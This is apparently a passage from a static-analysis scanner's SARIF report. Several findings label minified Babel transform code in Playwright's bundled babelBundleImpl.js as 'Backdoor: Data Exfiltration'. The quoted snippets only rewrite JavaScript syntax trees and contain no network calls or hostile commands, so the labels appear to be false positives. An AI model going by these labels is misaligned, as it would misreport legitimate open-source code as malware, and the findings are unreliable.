                      "text": "sh({id:i,init:r(s)})}return s}var sle=(0,i0.merge)([{ThisExpression(e,{thisPaths:t}){t.push(e)},JSXIdentifier(e,{thisPaths:t}){e.node.name===\"this\"&&(!e.parentPath.isJSXMemberExpression({object:e.node})&&!e.parentPath.isJSXOpeningElement({name:e.node})||t.push(e))},CallExpression(e,{superCalls:t}){e.get(\"callee\").isSuper()&&t.push(e)},MemberExpression(e,{superProps:t}){e.get(\"object\").isSuper()&&t.push(e)},Identifier(e,{argumentsPaths:t}){if(!e.isReferencedIdentifier({name:\"arguments\"}))return;let r=e.scope;do{if(r.hasOwnBinding(\"arguments\")){r.rename(\"arguments\");return}if(r.path.isFunction()&&!r.",
                      "markdown": "`sh({id:i,init:r(s)})}return s}var sle=(0,i0.merge)([{ThisExpression(e,{thisPaths:t}){t.push(e)},JSXIdentifier(e,{thisPaths:t}){e.node.name===\"this\"&&(!e.parentPath.isJSXMemberExpression({object:e.node})&&!e.parentPath.isJSXOpeningElement({name:e.node})||t.push(e))},CallExpression(e,{superCalls:t}){e.get(\"callee\").isSuper()&&t.push(e)},MemberExpression(e,{superProps:t}){e.get(\"object\").isSuper()&&t.push(e)},Identifier(e,{argumentsPaths:t}){if(!e.isReferencedIdentifier({name:\"arguments\"}))return;let r=e.scope;do{if(r.hasOwnBinding(\"arguments\")){r.rename(\"arguments\");return}if(r.path.isFunction()&&!r.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 8163,
                  "endLine": 66,
                  "endColumn": 8168,
                  "snippet": {
                    "text": "oe(i));let a=r.get(\"expressions.0.right\"),o=r.get(\"expressions.1.left\");return[a,o]}return[e];function t(r,n,s){return r===\"=\"?ii(\"=\",n,s):r0(r,n,s)}}function GA(e){return e.isClassMethod()&&!!e.parentPath.parentPath.node.superClass}var ele=(0,i0.merge)([{CallExpression(e,{supers:t,thisBinding:r}){e.get(\"callee\").isSuper()&&(t.has(e.node)||(t.add(e.node),e.replaceWithMultiple([e.node,ii(\"=\",At(r),At(\"this\"))])))}},s0.default]);function tle(e,t){return Oo(e,\"this\",r=>{if(!t||!GA(e))return Io();e.traverse(ele,{supers:new WeakSet,thisBinding:r})})}function rle(e){return Oo(e,\"supercall\",()=>{let t=e.s",
                    "rendered": {
                      "text": "oe(i));let a=r.get(\"expressions.0.right\"),o=r.get(\"expressions.1.left\");return[a,o]}return[e];function t(r,n,s){return r===\"=\"?ii(\"=\",n,s):r0(r,n,s)}}function GA(e){return e.isClassMethod()&&!!e.parentPath.parentPath.node.superClass}var ele=(0,i0.merge)([{CallExpression(e,{supers:t,thisBinding:r}){e.get(\"callee\").isSuper()&&(t.has(e.node)||(t.add(e.node),e.replaceWithMultiple([e.node,ii(\"=\",At(r),At(\"this\"))])))}},s0.default]);function tle(e,t){return Oo(e,\"this\",r=>{if(!t||!GA(e))return Io();e.traverse(ele,{supers:new WeakSet,thisBinding:r})})}function rle(e){return Oo(e,\"supercall\",()=>{let t=e.s",
                      "markdown": "`oe(i));let a=r.get(\"expressions.0.right\"),o=r.get(\"expressions.1.left\");return[a,o]}return[e];function t(r,n,s){return r===\"=\"?ii(\"=\",n,s):r0(r,n,s)}}function GA(e){return e.isClassMethod()&&!!e.parentPath.parentPath.node.superClass}var ele=(0,i0.merge)([{CallExpression(e,{supers:t,thisBinding:r}){e.get(\"callee\").isSuper()&&(t.has(e.node)||(t.add(e.node),e.replaceWithMultiple([e.node,ii(\"=\",At(r),At(\"this\"))])))}},s0.default]);function tle(e,t){return Oo(e,\"this\",r=>{if(!t||!GA(e))return Io();e.traverse(ele,{supers:new WeakSet,thisBinding:r})})}function rle(e){return Oo(e,\"supercall\",()=>{let t=e.s`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 7908,
                  "endLine": 66,
                  "endColumn": 7913,
                  "snippet": {
                    "text": "e.object,s?ii(\"=\",s,e.node.property):e.node.property,e.node.computed)),ii(\"=\",Qr(e.node.object,s?At(s.name):e.node.property,e.node.computed),r0(e.parentPath.node.operator[0],At(n.name),Moe(1)))];e.parentPath.node.prefix||i.push(At(n.name)),r.replaceWith(Voe(i));let a=r.get(\"expressions.0.right\"),o=r.get(\"expressions.1.left\");return[a,o]}return[e];function t(r,n,s){return r===\"=\"?ii(\"=\",n,s):r0(r,n,s)}}function GA(e){return e.isClassMethod()&&!!e.parentPath.parentPath.node.superClass}var ele=(0,i0.merge)([{CallExpression(e,{supers:t,thisBinding:r}){e.get(\"callee\").isSuper()&&(t.has(e.node)||(t.add(e",
                    "rendered": {
                      "text": "e.object,s?ii(\"=\",s,e.node.property):e.node.property,e.node.computed)),ii(\"=\",Qr(e.node.object,s?At(s.name):e.node.property,e.node.computed),r0(e.parentPath.node.operator[0],At(n.name),Moe(1)))];e.parentPath.node.prefix||i.push(At(n.name)),r.replaceWith(Voe(i));let a=r.get(\"expressions.0.right\"),o=r.get(\"expressions.1.left\");return[a,o]}return[e];function t(r,n,s){return r===\"=\"?ii(\"=\",n,s):r0(r,n,s)}}function GA(e){return e.isClassMethod()&&!!e.parentPath.parentPath.node.superClass}var ele=(0,i0.merge)([{CallExpression(e,{supers:t,thisBinding:r}){e.get(\"callee\").isSuper()&&(t.has(e.node)||(t.add(e",
                      "markdown": "`e.object,s?ii(\"=\",s,e.node.property):e.node.property,e.node.computed)),ii(\"=\",Qr(e.node.object,s?At(s.name):e.node.property,e.node.computed),r0(e.parentPath.node.operator[0],At(n.name),Moe(1)))];e.parentPath.node.prefix||i.push(At(n.name)),r.replaceWith(Voe(i));let a=r.get(\"expressions.0.right\"),o=r.get(\"expressions.1.left\");return[a,o]}return[e];function t(r,n,s){return r===\"=\"?ii(\"=\",n,s):r0(r,n,s)}}function GA(e){return e.isClassMethod()&&!!e.parentPath.parentPath.node.superClass}var ele=(0,i0.merge)([{CallExpression(e,{supers:t,thisBinding:r}){e.get(\"callee\").isSuper()&&(t.has(e.node)||(t.add(e`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 7877,
                  "endLine": 66,
                  "endColumn": 7882,
                  "snippet": {
                    "text": "rop\"):null,i=[ii(\"=\",n,Qr(e.node.object,s?ii(\"=\",s,e.node.property):e.node.property,e.node.computed)),ii(\"=\",Qr(e.node.object,s?At(s.name):e.node.property,e.node.computed),r0(e.parentPath.node.operator[0],At(n.name),Moe(1)))];e.parentPath.node.prefix||i.push(At(n.name)),r.replaceWith(Voe(i));let a=r.get(\"expressions.0.right\"),o=r.get(\"expressions.1.left\");return[a,o]}return[e];function t(r,n,s){return r===\"=\"?ii(\"=\",n,s):r0(r,n,s)}}function GA(e){return e.isClassMethod()&&!!e.parentPath.parentPath.node.superClass}var ele=(0,i0.merge)([{CallExpression(e,{supers:t,thisBinding:r}){e.get(\"callee\").isSu",
                    "rendered": {
                      "text": "rop\"):null,i=[ii(\"=\",n,Qr(e.node.object,s?ii(\"=\",s,e.node.property):e.node.property,e.node.computed)),ii(\"=\",Qr(e.node.object,s?At(s.name):e.node.property,e.node.computed),r0(e.parentPath.node.operator[0],At(n.name),Moe(1)))];e.parentPath.node.prefix||i.push(At(n.name)),r.replaceWith(Voe(i));let a=r.get(\"expressions.0.right\"),o=r.get(\"expressions.1.left\");return[a,o]}return[e];function t(r,n,s){return r===\"=\"?ii(\"=\",n,s):r0(r,n,s)}}function GA(e){return e.isClassMethod()&&!!e.parentPath.parentPath.node.superClass}var ele=(0,i0.merge)([{CallExpression(e,{supers:t,thisBinding:r}){e.get(\"callee\").isSu",
                      "markdown": "`rop\"):null,i=[ii(\"=\",n,Qr(e.node.object,s?ii(\"=\",s,e.node.property):e.node.property,e.node.computed)),ii(\"=\",Qr(e.node.object,s?At(s.name):e.node.property,e.node.computed),r0(e.parentPath.node.operator[0],At(n.name),Moe(1)))];e.parentPath.node.prefix||i.push(At(n.name)),r.replaceWith(Voe(i));let a=r.get(\"expressions.0.right\"),o=r.get(\"expressions.1.left\");return[a,o]}return[e];function t(r,n,s){return r===\"=\"?ii(\"=\",n,s):r0(r,n,s)}}function GA(e){return e.isClassMethod()&&!!e.parentPath.parentPath.node.superClass}var ele=(0,i0.merge)([{CallExpression(e,{supers:t,thisBinding:r}){e.get(\"callee\").isSu`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 7396,
                  "endLine": 66,
                  "endColumn": 7401,
                  "snippet": {
                    "text": "get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.node.operator=\"=\",[r.get(\"left\"),r.get(\"right\").get(\"left\")]}else if(e.parentPath.isUpdateExpression()){let r=e.parentPath,n=e.scope.generateDeclaredUidIdentifier(\"tmp\"),s=e.node.computed?e.scope.generateDeclaredUidIdentifier(\"prop\"):null,i=[ii(\"=\",n,Qr(e.node.object,s?ii(\"=\",s,e.node.property):e.node.property,e.node.computed)),ii(\"=\",Qr(e.node.objec",
                    "rendered": {
                      "text": "get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.node.operator=\"=\",[r.get(\"left\"),r.get(\"right\").get(\"left\")]}else if(e.parentPath.isUpdateExpression()){let r=e.parentPath,n=e.scope.generateDeclaredUidIdentifier(\"tmp\"),s=e.node.computed?e.scope.generateDeclaredUidIdentifier(\"prop\"):null,i=[ii(\"=\",n,Qr(e.node.object,s?ii(\"=\",s,e.node.property):e.node.property,e.node.computed)),ii(\"=\",Qr(e.node.objec",
                      "markdown": "`get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.node.operator=\"=\",[r.get(\"left\"),r.get(\"right\").get(\"left\")]}else if(e.parentPath.isUpdateExpression()){let r=e.parentPath,n=e.scope.generateDeclaredUidIdentifier(\"tmp\"),s=e.node.computed?e.scope.generateDeclaredUidIdentifier(\"prop\"):null,i=[ii(\"=\",n,Qr(e.node.object,s?ii(\"=\",s,e.node.property):e.node.property,e.node.computed)),ii(\"=\",Qr(e.node.objec`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 7383,
                  "endLine": 66,
                  "endColumn": 7388,
                  "snippet": {
                    "text": ",a,l),!0)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.node.operator=\"=\",[r.get(\"left\"),r.get(\"right\").get(\"left\")]}else if(e.parentPath.isUpdateExpression()){let r=e.parentPath,n=e.scope.generateDeclaredUidIdentifier(\"tmp\"),s=e.node.computed?e.scope.generateDeclaredUidIdentifier(\"prop\"):null,i=[ii(\"=\",n,Qr(e.node.object,s?ii(\"=\",s,e.node.property):e.node.property,e.node.computed)),ii(\"=\",Qr",
                    "rendered": {
                      "text": ",a,l),!0)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.node.operator=\"=\",[r.get(\"left\"),r.get(\"right\").get(\"left\")]}else if(e.parentPath.isUpdateExpression()){let r=e.parentPath,n=e.scope.generateDeclaredUidIdentifier(\"tmp\"),s=e.node.computed?e.scope.generateDeclaredUidIdentifier(\"prop\"):null,i=[ii(\"=\",n,Qr(e.node.object,s?ii(\"=\",s,e.node.property):e.node.property,e.node.computed)),ii(\"=\",Qr",
                      "markdown": "`,a,l),!0)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.node.operator=\"=\",[r.get(\"left\"),r.get(\"right\").get(\"left\")]}else if(e.parentPath.isUpdateExpression()){let r=e.parentPath,n=e.scope.generateDeclaredUidIdentifier(\"tmp\"),s=e.node.computed?e.scope.generateDeclaredUidIdentifier(\"prop\"):null,i=[ii(\"=\",n,Qr(e.node.object,s?ii(\"=\",s,e.node.property):e.node.property,e.node.computed)),ii(\"=\",Qr`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 7369,
                  "endLine": 66,
                  "endColumn": 7374,
                  "snippet": {
                    "text": "th(Qr(o,ii(\"=\",a,l),!0)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.node.operator=\"=\",[r.get(\"left\"),r.get(\"right\").get(\"left\")]}else if(e.parentPath.isUpdateExpression()){let r=e.parentPath,n=e.scope.generateDeclaredUidIdentifier(\"tmp\"),s=e.node.computed?e.scope.generateDeclaredUidIdentifier(\"prop\"):null,i=[ii(\"=\",n,Qr(e.node.object,s?ii(\"=\",s,e.node.property):e.node.property,e.node.comput",
                    "rendered": {
                      "text": "th(Qr(o,ii(\"=\",a,l),!0)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.node.operator=\"=\",[r.get(\"left\"),r.get(\"right\").get(\"left\")]}else if(e.parentPath.isUpdateExpression()){let r=e.parentPath,n=e.scope.generateDeclaredUidIdentifier(\"tmp\"),s=e.node.computed?e.scope.generateDeclaredUidIdentifier(\"prop\"):null,i=[ii(\"=\",n,Qr(e.node.object,s?ii(\"=\",s,e.node.property):e.node.property,e.node.comput",
                      "markdown": "`th(Qr(o,ii(\"=\",a,l),!0)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.node.operator=\"=\",[r.get(\"left\"),r.get(\"right\").get(\"left\")]}else if(e.parentPath.isUpdateExpression()){let r=e.parentPath,n=e.scope.generateDeclaredUidIdentifier(\"tmp\"),s=e.node.computed?e.scope.generateDeclaredUidIdentifier(\"prop\"):null,i=[ii(\"=\",n,Qr(e.node.object,s?ii(\"=\",s,e.node.property):e.node.property,e.node.comput`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 7234,
                  "endLine": 66,
                  "endColumn": 7239,
                  "snippet": {
                    "text": "Qoe(n);if(e.node.computed){let a=e.scope.generateDeclaredUidIdentifier(\"tmp\"),o=e.node.object,l=e.node.property;r.get(\"left\").replaceWith(Qr(o,ii(\"=\",a,l),!0)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.node.operator=\"=\",[r.get(\"left\"),r.get(\"right\").get(\"left\")]}else if(e.parentPath.isUpdateExpression()){let r=e.parentPath,n=e.scope.generateDeclaredUidIdentifier(\"tmp\"),s=e.node.computed?e.",
                    "rendered": {
                      "text": "Qoe(n);if(e.node.computed){let a=e.scope.generateDeclaredUidIdentifier(\"tmp\"),o=e.node.object,l=e.node.property;r.get(\"left\").replaceWith(Qr(o,ii(\"=\",a,l),!0)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.node.operator=\"=\",[r.get(\"left\"),r.get(\"right\").get(\"left\")]}else if(e.parentPath.isUpdateExpression()){let r=e.parentPath,n=e.scope.generateDeclaredUidIdentifier(\"tmp\"),s=e.node.computed?e.",
                      "markdown": "`Qoe(n);if(e.node.computed){let a=e.scope.generateDeclaredUidIdentifier(\"tmp\"),o=e.node.object,l=e.node.property;r.get(\"left\").replaceWith(Qr(o,ii(\"=\",a,l),!0)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.node.operator=\"=\",[r.get(\"left\"),r.get(\"right\").get(\"left\")]}else if(e.parentPath.isUpdateExpression()){let r=e.parentPath,n=e.scope.generateDeclaredUidIdentifier(\"tmp\"),s=e.node.computed?e.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 7199,
                  "endLine": 66,
                  "endColumn": 7204,
                  "snippet": {
                    "text": "rator.slice(0,-1),s=r.node.right,i=Qoe(n);if(e.node.computed){let a=e.scope.generateDeclaredUidIdentifier(\"tmp\"),o=e.node.object,l=e.node.property;r.get(\"left\").replaceWith(Qr(o,ii(\"=\",a,l),!0)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.node.operator=\"=\",[r.get(\"left\"),r.get(\"right\").get(\"left\")]}else if(e.parentPath.isUpdateExpression()){let r=e.parentPath,n=e.scope.generateDeclaredUidIde",
                    "rendered": {
                      "text": "rator.slice(0,-1),s=r.node.right,i=Qoe(n);if(e.node.computed){let a=e.scope.generateDeclaredUidIdentifier(\"tmp\"),o=e.node.object,l=e.node.property;r.get(\"left\").replaceWith(Qr(o,ii(\"=\",a,l),!0)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.node.operator=\"=\",[r.get(\"left\"),r.get(\"right\").get(\"left\")]}else if(e.parentPath.isUpdateExpression()){let r=e.parentPath,n=e.scope.generateDeclaredUidIde",
                      "markdown": "`rator.slice(0,-1),s=r.node.right,i=Qoe(n);if(e.node.computed){let a=e.scope.generateDeclaredUidIdentifier(\"tmp\"),o=e.node.object,l=e.node.property;r.get(\"left\").replaceWith(Qr(o,ii(\"=\",a,l),!0)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.node.operator=\"=\",[r.get(\"left\"),r.get(\"right\").get(\"left\")]}else if(e.parentPath.isUpdateExpression()){let r=e.parentPath,n=e.scope.generateDeclaredUidIde`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 7095,
                  "endLine": 66,
                  "endColumn": 7100,
                  "snippet": {
                    "text": "e.parentPath.isAssignmentExpression()&&e.parentPath.node.operator!==\"=\"){let r=e.parentPath,n=r.node.operator.slice(0,-1),s=r.node.right,i=Qoe(n);if(e.node.computed){let a=e.scope.generateDeclaredUidIdentifier(\"tmp\"),o=e.node.object,l=e.node.property;r.get(\"left\").replaceWith(Qr(o,ii(\"=\",a,l),!0)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.node.operator=\"=\",[r.get(\"left\"),r.get(\"right\").get",
                    "rendered": {
                      "text": "e.parentPath.isAssignmentExpression()&&e.parentPath.node.operator!==\"=\"){let r=e.parentPath,n=r.node.operator.slice(0,-1),s=r.node.right,i=Qoe(n);if(e.node.computed){let a=e.scope.generateDeclaredUidIdentifier(\"tmp\"),o=e.node.object,l=e.node.property;r.get(\"left\").replaceWith(Qr(o,ii(\"=\",a,l),!0)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.node.operator=\"=\",[r.get(\"left\"),r.get(\"right\").get",
                      "markdown": "`e.parentPath.isAssignmentExpression()&&e.parentPath.node.operator!==\"=\"){let r=e.parentPath,n=r.node.operator.slice(0,-1),s=r.node.right,i=Qoe(n);if(e.node.computed){let a=e.scope.generateDeclaredUidIdentifier(\"tmp\"),o=e.node.object,l=e.node.property;r.get(\"left\").replaceWith(Qr(o,ii(\"=\",a,l),!0)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.node.operator=\"=\",[r.get(\"left\"),r.get(\"right\").get`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 7047,
                  "endLine": 66,
                  "endColumn": 7052,
                  "snippet": {
                    "text": "oe(e){return joe.includes(e)}function Zoe(e){if(e.parentPath.isAssignmentExpression()&&e.parentPath.node.operator!==\"=\"){let r=e.parentPath,n=r.node.operator.slice(0,-1),s=r.node.right,i=Qoe(n);if(e.node.computed){let a=e.scope.generateDeclaredUidIdentifier(\"tmp\"),o=e.node.object,l=e.node.property;r.get(\"left\").replaceWith(Qr(o,ii(\"=\",a,l),!0)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.nod",
                    "rendered": {
                      "text": "oe(e){return joe.includes(e)}function Zoe(e){if(e.parentPath.isAssignmentExpression()&&e.parentPath.node.operator!==\"=\"){let r=e.parentPath,n=r.node.operator.slice(0,-1),s=r.node.right,i=Qoe(n);if(e.node.computed){let a=e.scope.generateDeclaredUidIdentifier(\"tmp\"),o=e.node.object,l=e.node.property;r.get(\"left\").replaceWith(Qr(o,ii(\"=\",a,l),!0)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.nod",
                      "markdown": "`oe(e){return joe.includes(e)}function Zoe(e){if(e.parentPath.isAssignmentExpression()&&e.parentPath.node.operator!==\"=\"){let r=e.parentPath,n=r.node.operator.slice(0,-1),s=r.node.right,i=Qoe(n);if(e.node.computed){let a=e.scope.generateDeclaredUidIdentifier(\"tmp\"),o=e.node.object,l=e.node.property;r.get(\"left\").replaceWith(Qr(o,ii(\"=\",a,l),!0)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(o,At(a.name),!0),s))}else{let a=e.node.object,o=e.node.property;r.get(\"left\").replaceWith(Qr(a,o)),r.get(\"right\").replaceWith(t(i?\"=\":n,Qr(a,At(o.name)),s))}return i?r.replaceWith(Foe(n,r.node.left,r.node.right)):r.nod`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
